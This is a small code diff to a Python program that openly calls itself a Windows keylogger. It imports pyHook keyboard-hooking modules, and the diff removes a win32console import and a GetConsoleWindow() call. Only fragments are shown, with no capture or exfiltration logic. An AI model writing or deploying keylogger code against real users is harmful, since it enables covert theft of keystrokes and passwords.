@@ -1,6 +1,4 @@
-# Python code for keylogger 
-# to be used in windows 
-import win32console 
+# Python code for keylogger to be used in windows 
 import pythoncom, pyHook 
 import os, sys
 from EventManager import EventManager, KeyEvent
@@ -137,8 +135,6 @@ class Logger:
 
 if __name__ == "__main__":
     main_cfg = load_cfg('./main_cfg.json')    
-    
-    win = win32console.GetConsoleWindow()
     
     eventManager = EventManager(main_cfg)
     
